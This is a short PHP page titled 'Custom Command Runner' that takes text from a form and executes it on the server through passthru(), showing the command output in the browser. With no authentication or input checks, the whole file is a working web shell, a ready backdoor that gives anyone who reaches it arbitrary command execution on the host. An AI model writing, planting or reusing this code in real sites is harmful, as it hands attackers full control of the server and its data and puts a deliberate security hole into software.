<?php
echo "<head><meta http-equiv='content-type' content='text/html; charset=UTF-8'><                                                                                                                                                             title>Custom Command Runner</title></head>";
echo "<body style=background-color:c8c9cf>";

echo "<b> Input Command to run: </b> <br>";
echo "<textarea id='actiontext' class='text' cols='50' rows='4' maxlength='250'                                                                                                                                                              name='actiontext' form='submitactionform'></textarea>";
echo "<form method='post' id='submitactionform' name='submitactionform'>";
echo "<input type='submit' name = 'subaction' value='Run Command'></form>";
if(isset($_POST['subaction'])) {
   $submittedtext = $_POST['actiontext'];
   if(empty($_POST['actiontext'])){
        echo "no command submitted <br>";
        }
    else {
        echo "<pre>";
        echo "<br><br><b> Command Output </b><br>";
        passthru($submittedtext);
        echo "</pre>";
        }
    }
echo"</body>";

?>
